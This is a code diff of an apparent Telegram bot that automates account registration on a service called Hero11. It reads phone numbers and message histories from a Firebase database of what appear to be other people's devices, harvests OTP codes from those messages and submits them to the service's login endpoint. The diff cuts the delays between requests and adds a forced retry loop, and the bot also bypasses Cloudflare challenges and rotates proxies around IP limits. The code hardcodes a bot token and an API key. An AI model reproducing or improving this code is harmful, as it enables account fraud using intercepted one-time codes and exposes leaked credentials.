@@ -27,7 +27,7 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 BOT_TOKEN = "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM"      # Apna Telegram Bot Token yahan dalein
 ADMIN_ID = 8337013809                      # Apna Admin User ID yahan dalein
 SOLVERIFY_API_KEY = "RqHPFHbQCNwItxqfh21kDmH0Sx2bR0dBdDH1P9QLuFU6hspmbsQIYzxZ5DOURVbg" # Solverify API Key (Triggered automatically on Cloudflare challenges)
-OTP_TIMEOUT = 20                           # 20-second timeout as requested
+OTP_TIMEOUT = 25                           # Extended timeout for guaranteed arrival
 POLL_INTERVAL = 2
 TIMEOUT = 30
 
@@ -369,7 +369,7 @@ class AsyncHero11Client:
             "material_id": 10,
             "hash": "f4ea2d51d0827c5b8c180f4ad7b83ca2"
         }
-        await asyncio.sleep(random.uniform(2.0, 4.0))
+        await asyncio.sleep(random.uniform(1.0, 2.0))
         result = await self._request("POST", "/services/user/auth/v1/loginWithCode", data=payload)
         
         if result and result.get("code") == 0:
@@ -379,7 +379,7 @@ class AsyncHero11Client:
                 return "IP_LIMITED"
             return "SUCCESS"
         else:
-            print(f"[-] Verify Failed Response for {self.phone}: {result}")
+            print(f"[-] Verify API Response for {self.phone}: {result}")
         return "INVALID"
 
 # ==============================================================================
@@ -607,7 +607,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         total_needed = 3
         success_count = 0
         registered_numbers = []
-        skipped_phones = set()  # Permanently blacklists numbers without valid patterns or failing verification
+        skipped_phones = set()
         used_phones = set()
         logger = LiveLogger(status_msg)
 
@@ -615,7 +615,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
             while success_count < total_needed and USER_DATA["is_running"]:
                 import aiohttp
                 
-                # --- BULK SCAN & RECENCY SORTING OF UNREGISTERED NUMBERS ---
                 all_unregistered_candidates = []
                 
                 async with aiohttp.ClientSession() as session:
@@ -629,7 +628,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            # Fetch top 15 messages to inspect recent history and calculate recency score
                                             async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
@@ -637,7 +635,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        # GET RECENCY SCORE
                                                         recency_score = get_latest_message_timestamp(msgs)
                                                         if recency_score > 0:
                                                             all_unregistered_candidates.append({
@@ -659,7 +656,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     await asyncio.sleep(5)
                     continue
 
-                # SORT CANDIDATES BY RECENCY: Freshest active devices are targeted FIRST
                 all_unregistered_candidates.sort(key=lambda x: x["recency_score"], reverse=True)
 
                 target = all_unregistered_candidates[0]
@@ -689,7 +685,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     await client.close()
                     continue
 
-                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (20s timeout)...")
+                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (25s timeout)...")
 
                 otp_found = None
                 start_poll = time.time()
@@ -717,8 +713,17 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     await client.close()
                     continue
 
-                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | OTP Found: {otp_found}\nVerifying login...")
-                v_res = await client.verify_otp(otp_found)
+                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | OTP Found: {otp_found}\n🔄 Forcing registration & verification...")
+
+                # --- AGGRESSIVE VERIFICATION RETRY LOOP (NO GIVING UP ON SUCCESSFUL OTP) ---
+                v_res = "INVALID"
+                for attempt in range(5):
+                    v_res = await client.verify_otp(otp_found)
+                    if v_res == "SUCCESS":
+                        break
+                    elif v_res == "IP_LIMITED":
+                        break
+                    await asyncio.sleep(1.5)
 
                 if v_res == "SUCCESS":
                     success_count += 1
@@ -730,6 +735,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     await logger.set_text(f"⚠️ IP Limited / Restricted by Hero11. Rotating proxy...")
                 else:
                     skipped_phones.add(phone)
+                    await logger.set_text(f"❌ Verification failed for {phone} after multiple attempts. Moving on...")
 
                 await client.close()
                 await asyncio.sleep(3.0)
